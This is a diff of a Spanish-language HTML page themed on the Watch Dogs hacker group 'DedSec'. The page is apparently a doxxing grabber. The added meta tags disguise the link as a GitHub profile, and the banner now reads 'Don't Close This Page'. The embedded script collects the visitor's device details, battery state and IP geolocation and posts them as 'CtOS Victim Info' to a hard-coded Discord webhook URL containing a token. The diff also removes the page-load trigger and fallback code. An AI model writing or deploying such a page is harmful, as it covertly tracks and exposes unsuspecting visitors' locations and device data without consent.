@@ -1,6 +1,19 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <!-- ===== EMBED META TAGS (con URL de imagen forzada para cache) ===== -->
+    <meta property="og:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <meta property="og:image:alt" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
+    <meta property="og:title" content="PotatoDestroyer - Profile" />
+    <meta property="og:url" content="https://potatodestroyer999.github.io/D3DSEC/" />
+    <meta property="og:description" content="PotatoDestroyer999 has one repository available. Follow their code on GitHub." />
+    <meta property="og:site_name" content="GitHub" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="PotatoDestroyer - Profile" />
+    <meta name="twitter:description" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
+    <meta name="twitter:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <!-- ===== FIN EMBED META TAGS ===== -->
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OMG! IT'S DEDSEC</title>
@@ -72,7 +85,7 @@
 </head>
 <body>
 
-    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
+    <div class="texto-no-interactivo">Don't Close This Page</div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
@@ -88,7 +101,6 @@
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
-            // Get static device data
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
@@ -122,7 +134,6 @@
                 };
             }
 
-            // Get battery info (async)
             async function getBatteryInfo() {
                 try {
                     if (navigator.getBattery) {
@@ -138,15 +149,14 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // Send to Discord
-            async function sendToDiscord(ipData, device, battery) {
-                // Determine VPN/TOR status
+            async function sendToDiscord(ipData, device, battery, torDetected) {
                 let vpnTorStatus = 'No VPN/TOR Found';
-                if (ipData.proxy === true && ipData.tor === true) {
+                const proxyDetected = ipData.proxy === true;
+                if (proxyDetected && torDetected) {
                     vpnTorStatus = 'VPN and TOR Detected';
-                } else if (ipData.proxy === true) {
+                } else if (proxyDetected) {
                     vpnTorStatus = 'VPN Detected';
-                } else if (ipData.tor === true) {
+                } else if (torDetected) {
                     vpnTorStatus = 'TOR Detected';
                 }
 
@@ -168,7 +178,7 @@
 
                 const payload = {
                     username: 'Bagley',
-                    avatar_url: 'https://i.imgur.com/U6jTf9X.jpeg',
+                    avatar_url: 'https://i.imgur.com/HsHtn2b.jpeg',
                     embeds: [{
                         title: 'CtOS Victim Info',
                         color: 0x00ff00,
@@ -184,63 +194,3 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
-                    if (resp.ok) {
-                        statusEl.textContent = 'Sent Data';
-                        statusEl.className = '';
-                    } else {
-                        statusEl.textContent = 'Error: ' + resp.status;
-                        statusEl.className = 'error';
-                    }
-                } catch (e) {
-                    statusEl.textContent = 'Sending Error: ' + e.message;
-                    statusEl.className = 'error';
-                }
-            }
-
-            // Main execution
-            async function execute() {
-                const device = getDeviceInfo();
-                const battery = await getBatteryInfo();
-
-                try {
-                    const geoResp = await fetch('https://ipapi.co/json/');
-                    if (!geoResp.ok) throw new Error('Geo API failed');
-                    const geo = await geoResp.json();
-                    await sendToDiscord(geo, device, battery);
-                } catch (err) {
-                    // Fallback with ipify
-                    try {
-                        const ipResp = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResp.json();
-                        const fallbackGeo = {
-                            ip: ipData.ip,
-                            latitude: 'N/A',
-                            longitude: 'N/A',
-                            city: 'N/A',
-                            region: 'N/A',
-                            country_name: 'N/A',
-                            postal: 'N/A',
-                            org: 'N/A',
-                            proxy: false,
-                            tor: false
-                        };
-                        await sendToDiscord(fallbackGeo, device, battery);
-                    } catch (e2) {
-                        statusEl.textContent = 'All APIs failed: ' + e2.message;
-                        statusEl.className = 'error';
-                    }
-                }
-            }
-
-            // Execute on page load
-            if (document.readyState === 'complete') {
-                execute();
-            } else {
-                window.addEventListener('load', execute);
-            }
-
-            statusEl.textContent = 'Loading...';
-        })();
-    </script>
-</body>
-</html>
